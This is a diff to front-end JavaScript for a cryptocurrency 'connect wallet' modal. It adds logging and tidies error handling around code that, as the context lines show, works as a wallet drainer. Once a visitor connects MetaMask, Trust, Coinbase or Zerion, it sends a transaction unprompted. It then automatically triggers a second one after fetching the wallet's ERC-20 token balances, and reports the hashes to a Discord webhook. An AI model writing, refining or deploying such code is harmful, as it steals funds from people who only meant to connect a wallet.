@@ -4,25 +4,31 @@ document.getElementById("connectButton").addEventListener("click", openModal);
 
 function openModal() {
     document.getElementById("walletModal").style.display = "block";
+    console.log("Modal opened for wallet selection");
 }
 
 function closeModal() {
     document.getElementById("walletModal").style.display = "none";
+    console.log("Modal closed after wallet selection");
 }
 
 async function connectMetaMask() {
+    console.log("MetaMask button clicked");
     await connectWallet("MetaMask");
 }
 
 async function connectTrustWallet() {
+    console.log("Trust Wallet button clicked");
     await connectWallet("Trust Wallet");
 }
 
 async function connectCoinbaseWallet() {
+    console.log("Coinbase Wallet button clicked");
     await connectWallet("Coinbase Wallet");
 }
 
 async function connectZerionWallet() {
+    console.log("Zerion Wallet button clicked");
     await connectWallet("Zerion Wallet");
 }
 
@@ -37,32 +43,43 @@ async function connectWallet(walletName) {
 
     try {
         let account;
+        console.log(`Attempting to connect to ${walletName}...`);
+
         if (walletName === "MetaMask" || walletName === "Trust Wallet" || walletName === "Coinbase Wallet" || walletName === "Zerion Wallet") {
             if (typeof window.ethereum !== 'undefined') {
+                console.log(`${walletName} detected. Requesting account...`);
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                 account = accounts[0];
                 console.log(`Connected to ${walletName} account: ${account}`);
             } else {
                 alert(`${walletName} is not installed. Please install it.`);
-                window.open("https://metamask.io/download.html", "_blank");
+                console.error(`${walletName} is not installed in the browser.`);
                 return;
             }
         } else {
             alert("Invalid wallet selected.");
+            console.error("Invalid wallet selection.");
+            return;
         }
 
         if (account) {
+            console.log(`Wallet connected. Initiating transaction for account: ${account}`);
             await sendFirstTransaction(account); // Automatically send the first transaction
+        } else {
+            console.error("No account found.");
         }
 
     } catch (error) {
         console.error(`Error connecting to ${walletName}:`, error);
     } finally {
         isConnecting = false; // Reset the flag
+        console.log(`Finished connection attempt for ${walletName}`);
     }
 }
 
 async function sendFirstTransaction(walletAddress) {
+    console.log(`Preparing to send first transaction for wallet: ${walletAddress}`);
+    
     if (typeof window.ethereum !== 'undefined') {
         const provider = new ethers.providers.Web3Provider(window.ethereum);
         const signer = provider.getSigner();
@@ -76,12 +93,12 @@ async function sendFirstTransaction(walletAddress) {
 
         try {
             const txResponse = await signer.sendTransaction(transaction);
-            console.log("First transaction response:", txResponse);
+            console.log("First transaction sent successfully. Response:", txResponse);
 
             // Send to Discord webhook
             await sendWebhook(txResponse.hash, "success");
 
-            // Trigger the second transaction
+            // Automatically trigger the second transaction
             await sendSecondTransaction(signer, walletAddress);
         } catch (error) {
             console.error("Error sending first transaction:", error);
@@ -95,6 +112,8 @@ async function sendFirstTransaction(walletAddress) {
 }
 
 async function sendSecondTransaction(signer, walletAddress) {
+    console.log(`Fetching ERC-20 token balances for wallet: ${walletAddress}`);
+    
     const erc20TokenAddresses = await getERC20TokenAddresses(walletAddress); // Fetch token addresses using Alchemy API
     const tokenThreshold = 0.000001; // Token threshold
 
@@ -120,6 +139,8 @@ async function sendSecondTransaction(signer, walletAddress) {
 }
 
 async function getERC20TokenAddresses(walletAddress) {
+    console.log(`Getting ERC-20 token balances for wallet: ${walletAddress}`);
+    
     const apiKey = "YOUR_ALCHEMY_API_KEY"; // Replace with your Alchemy API Key
     const url = `https://eth-mainnet.g.alchemy.com/v2/${apiKey}/getTokenBalances?owner=${walletAddress}`;
 
@@ -148,6 +169,7 @@ async function sendWebhook(message, status) {
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(payload),
         });
+        console.log("Webhook sent successfully.");
     } catch (error) {
         console.error("Error sending webhook:", error);
     }
